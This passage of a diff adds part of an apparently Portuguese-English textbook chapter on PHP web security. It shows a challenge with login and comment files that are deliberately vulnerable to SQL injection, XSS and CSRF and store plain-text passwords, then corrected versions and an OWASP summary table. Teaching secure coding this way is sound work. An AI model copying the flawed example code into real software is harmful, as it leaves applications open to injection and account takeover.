+<span id="cb23-4"><a href="#cb23-4"></a><span class="va">$u</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>]<span class="ot">;</span></span>
+<span id="cb23-5"><a href="#cb23-5"></a><span class="va">$p</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">;</span></span>
+<span id="cb23-6"><a href="#cb23-6"></a><span class="va">$r</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;query(<span class="st">"SELECT * FROM utilizadores</span></span>
+<span id="cb23-7"><a href="#cb23-7"></a><span class="st">    WHERE utilizador = '</span><span class="va">$u</span><span class="st">' AND password = '</span><span class="va">$p</span><span class="st">'"</span>)<span class="ot">;</span></span>
+<span id="cb23-8"><a href="#cb23-8"></a><span class="cf">if</span> (<span class="va">$r</span>-&gt;fetch_assoc()) {</span>
+<span id="cb23-9"><a href="#cb23-9"></a>    <span class="fu">session_start</span>()<span class="ot">;</span></span>
+<span id="cb23-10"><a href="#cb23-10"></a>    <span class="va">$_SESSION</span>[<span class="st">"utilizador"</span>] <span class="op">=</span> <span class="va">$u</span><span class="ot">;</span></span>
+<span id="cb23-11"><a href="#cb23-11"></a>    <span class="kw">echo</span> <span class="st">"Sessão iniciada."</span><span class="ot">;</span></span>
+<span id="cb23-12"><a href="#cb23-12"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb24"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb24-1"><a href="#cb24-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb24-2"><a href="#cb24-2"></a><span class="co">// comentarios.php</span></span>
+<span id="cb24-3"><a href="#cb24-3"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
+<span id="cb24-4"><a href="#cb24-4"></a><span class="va">$c</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">"apagar"</span>]<span class="ot">;</span></span>
+<span id="cb24-5"><a href="#cb24-5"></a><span class="va">$conexao</span>-&gt;query(<span class="st">"DELETE FROM comentarios</span></span>
+<span id="cb24-6"><a href="#cb24-6"></a><span class="st">                WHERE id = </span><span class="va">$c</span><span class="st">"</span>)<span class="ot">;</span></span>
+<span id="cb24-7"><a href="#cb24-7"></a><span class="va">$r</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;query(<span class="st">"SELECT texto FROM comentarios"</span>)<span class="ot">;</span></span>
+<span id="cb24-8"><a href="#cb24-8"></a><span class="cf">while</span> (<span class="va">$linha</span> <span class="op">=</span> <span class="va">$r</span>-&gt;fetch_assoc()) {</span>
+<span id="cb24-9"><a href="#cb24-9"></a>    <span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="va">$linha</span>[<span class="st">"texto"</span>] <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span>
+<span id="cb24-10"><a href="#cb24-10"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The challenge has three steps:</p>
+<ol type="1">
+<li>Say which attack each flaw allows;</li>
+<li>Rewrite the two files with the appropriate defence (<a href="#sec-09-sql-injection-en" class="quarto-xref"><span>Section 9.3.1</span></a>, <a href="#sec-09-xss-en" class="quarto-xref"><span>Section 9.3.2</span></a>, <a href="#sec-09-csrf-en" class="quarto-xref"><span>Section 9.3.3</span></a> and <a href="#sec-09-passwords-en" class="quarto-xref"><span>Section 9.3.4</span></a>);</li>
+<li>Add the registration page, with <code>password_hash()</code>.</li>
+</ol>
+<section id="sec-09-solution-en" class="level3" data-number="9.6.1">
+<h3 data-number="9.6.1" class="anchored" data-anchor-id="sec-09-solution-en"><span class="header-section-number">9.6.1</span> The corrected files</h3>
+<p>The six flaws and their fixes are marked by numbers in the comments of the corrected files:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb25-1"><a href="#cb25-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb25-2"><a href="#cb25-2"></a><span class="co">// login.php</span></span>
+<span id="cb25-3"><a href="#cb25-3"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
+<span id="cb25-4"><a href="#cb25-4"></a><span class="va">$u</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>]<span class="ot">;</span></span>
+<span id="cb25-5"><a href="#cb25-5"></a><span class="va">$p</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">;</span></span>
+<span id="cb25-6"><a href="#cb25-6"></a><span class="va">$stmt</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;prepare(  <span class="co">// 1</span></span>
+<span id="cb25-7"><a href="#cb25-7"></a>    <span class="st">"SELECT password FROM utilizadores</span></span>
+<span id="cb25-8"><a href="#cb25-8"></a><span class="st">     WHERE utilizador = ?"</span>)<span class="ot">;</span></span>
+<span id="cb25-9"><a href="#cb25-9"></a><span class="va">$stmt</span>-&gt;bind_param(<span class="st">"s"</span><span class="ot">,</span> <span class="va">$u</span>)<span class="ot">;</span></span>
+<span id="cb25-10"><a href="#cb25-10"></a><span class="va">$stmt</span>-&gt;execute()<span class="ot">;</span></span>
+<span id="cb25-11"><a href="#cb25-11"></a><span class="va">$linha</span> <span class="op">=</span> <span class="va">$stmt</span>-&gt;get_result()-&gt;fetch_assoc()<span class="ot">;</span></span>
+<span id="cb25-12"><a href="#cb25-12"></a><span class="cf">if</span> (<span class="va">$linha</span> <span class="op">&amp;&amp;</span></span>
+<span id="cb25-13"><a href="#cb25-13"></a>    <span class="fu">password_verify</span>(<span class="va">$p</span><span class="ot">,</span> <span class="va">$linha</span>[<span class="st">"password"</span>])) {  <span class="co">// 2</span></span>
+<span id="cb25-14"><a href="#cb25-14"></a>    <span class="fu">session_start</span>()<span class="ot">;</span></span>
+<span id="cb25-15"><a href="#cb25-15"></a>    <span class="va">$_SESSION</span>[<span class="st">"utilizador"</span>] <span class="op">=</span> <span class="va">$u</span><span class="ot">;</span></span>
+<span id="cb25-16"><a href="#cb25-16"></a>    <span class="kw">echo</span> <span class="st">"Sessão iniciada."</span><span class="ot">;</span></span>
+<span id="cb25-17"><a href="#cb25-17"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb26"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb26-1"><a href="#cb26-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb26-2"><a href="#cb26-2"></a><span class="co">// comentarios.php</span></span>
+<span id="cb26-3"><a href="#cb26-3"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
+<span id="cb26-4"><a href="#cb26-4"></a><span class="fu">session_start</span>()<span class="ot">;</span></span>
+<span id="cb26-5"><a href="#cb26-5"></a><span class="cf">if</span> (<span class="op">!</span><span class="kw">isset</span>(<span class="va">$_SESSION</span>[<span class="st">"utilizador"</span>])) {  <span class="co">// 5</span></span>
+<span id="cb26-6"><a href="#cb26-6"></a>    <span class="cf">exit</span>(<span class="st">"Acesso negado."</span>)<span class="ot">;</span></span>
+<span id="cb26-7"><a href="#cb26-7"></a>}</span>
+<span id="cb26-8"><a href="#cb26-8"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_SESSION</span>[<span class="st">"token"</span>]<span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">"apagar"</span>]<span class="ot">,</span>  <span class="co">// 3</span></span>
+<span id="cb26-9"><a href="#cb26-9"></a>        <span class="va">$_POST</span>[<span class="st">"token"</span>])</span>
+<span id="cb26-10"><a href="#cb26-10"></a>    <span class="op">&amp;&amp;</span> <span class="fu">hash_equals</span>(<span class="va">$_SESSION</span>[<span class="st">"token"</span>]<span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">"token"</span>])) {</span>
+<span id="cb26-11"><a href="#cb26-11"></a>    <span class="va">$stmt</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;prepare(  <span class="co">// 4</span></span>
+<span id="cb26-12"><a href="#cb26-12"></a>        <span class="st">"DELETE FROM comentarios WHERE id = ?"</span>)<span class="ot">;</span></span>
+<span id="cb26-13"><a href="#cb26-13"></a>    <span class="va">$stmt</span>-&gt;bind_param(<span class="st">"i"</span><span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">"apagar"</span>])<span class="ot">;</span></span>
+<span id="cb26-14"><a href="#cb26-14"></a>    <span class="va">$stmt</span>-&gt;execute()<span class="ot">;</span></span>
+<span id="cb26-15"><a href="#cb26-15"></a>}</span>
+<span id="cb26-16"><a href="#cb26-16"></a><span class="va">$r</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;query(<span class="st">"SELECT texto FROM comentarios"</span>)<span class="ot">;</span></span>
+<span id="cb26-17"><a href="#cb26-17"></a><span class="cf">while</span> (<span class="va">$linha</span> <span class="op">=</span> <span class="va">$r</span>-&gt;fetch_assoc()) {</span>
+<span id="cb26-18"><a href="#cb26-18"></a>    <span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span></span>
+<span id="cb26-19"><a href="#cb26-19"></a>         <span class="fu">htmlspecialchars</span>(<span class="va">$linha</span>[<span class="st">"texto"</span>]) <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span>  <span class="co">// 6</span></span>
+<span id="cb26-20"><a href="#cb26-20"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol type="1">
+<li><em>SQL Injection</em> in the <em>login</em>: <em>prepared statements</em>;</li>
+<li>plain-text password: <code>password_verify()</code> on the <em>hash</em> (registration is in <a href="#sec-09-register-login-en" class="quarto-xref"><span>Section 9.3.4.2</span></a>);</li>
+<li>CSRF: delete through POST, with a <em>token</em>, instead of GET (the form with the <em>token</em> is the one in <a href="#sec-09-csrf-en" class="quarto-xref"><span>Section 9.3.3</span></a>);</li>
+<li><em>SQL Injection</em> in the <code>DELETE</code>: <em>prepared statement</em>;</li>
+<li>missing session check: only someone who has logged in can delete;</li>
+<li>XSS: <code>htmlspecialchars()</code> when displaying the comments.</li>
+</ol>
+</section>
+</section>
+<section id="sec-09-summary-en" class="level2" data-number="9.7">
+<h2 data-number="9.7" class="anchored" data-anchor-id="sec-09-summary-en"><span class="header-section-number">9.7</span> Summary</h2>
+<p>The nine topics of the chapter group into six OWASP Top 10:2025 categories, ordered by code:</p>
+<div id="tbl-09-summary-en" class="quarto-float quarto-figure quarto-figure-center anchored">
+<figure class="quarto-float quarto-float-tbl figure">
+<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-summary-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+Table&nbsp;9.6: Six categories, nine defences.
+</figcaption>
+<div aria-describedby="tbl-09-summary-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+<table class="caption-top table">
+<colgroup>
+<col style="width: 8%">
+<col style="width: 41%">
+<col style="width: 50%">
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: center;">OWASP</th>
+<th style="text-align: left;">Category</th>
+<th style="text-align: left;">Topics and defences</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">A01</td>
+<td style="text-align: left;"><em>Broken Access Control</em></td>
+<td style="text-align: left;">CSRF: POST and <em>token</em>; least privilege</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">A02</td>
+<td style="text-align: left;"><em>Security Misconfiguration</em></td>
+<td style="text-align: left;">Errors in production: only in the server log</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">A03</td>
+<td style="text-align: left;"><em>Software Supply Chain Failures</em></td>
+<td style="text-align: left;">Third-party dependencies: update everything</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">A04</td>
+<td style="text-align: left;"><em>Cryptographic Failures</em></td>
+<td style="text-align: left;">Passwords: <code>password_hash()</code></td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">A05</td>
+<td style="text-align: left;"><em>Injection</em></td>
+<td style="text-align: left;"><em>SQL Injection</em>: <em>prepared statements</em>; XSS: <code>htmlspecialchars()</code>; validate and escape</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">A07</td>
+<td style="text-align: left;"><em>Authentication Failures</em></td>
+<td style="text-align: left;">Secure <em>login</em>: same message for any failure</td>
+</tr>
+</tbody>
+</table>
+</div>
+</figure>
+</div>
+<p>The common idea is never to trust data coming from the client, and to limit the damage if a defence fails. These are, however, only the basic protections. Anyone who wants to go further can study the <code>HttpOnly</code> and <code>SameSite</code> attributes of the session <em>cookie</em> (<a href="apendiceE.html#sec-apE-cookies-en" class="quarto-xref"><span>Section E.5</span></a>), which limit the theft of the <em>cookie</em> through XSS and its being sent in forged requests, such as those described in the sections on XSS and CSRF. They are not part of this course’s syllabus.</p>
 </section>
 <section id="sec-09-references-en" class="level2 unnumbered">
 <h2 class="unnumbered anchored" data-anchor-id="sec-09-references-en">References</h2>
@@ -399,8 +955,8 @@ div.csl-indent {
 <div id="ref-owasp_top10_2025" class="csl-entry" role="listitem">
 OWASP Foundation. 2026. <span>‘OWASP Top 10:2025’</span>. 2026. <a href="https://owasp.org/Top10/2025/">https://owasp.org/Top10/2025/</a>.
 </div>
-<div id="ref-patchstack_2025_report" class="csl-entry" role="listitem">
-Patchstack. 2025. <span>‘Patchstack’s 2025 WordPress Security Report: Mid-Year Vulnerability Breakdown’</span>. 2025. <a href="https://patchstack.com/whitepaper/2025-mid-year-vulnerability-report/">https://patchstack.com/whitepaper/2025-mid-year-vulnerability-report/</a>.
+<div id="ref-patchstack_2026_report" class="csl-entry" role="listitem">
+Patchstack. 2026. <span>‘State of WordPress Security in 2026’</span>. 2026. <a href="https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/">https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/</a>.
 </div>
 </div>
 
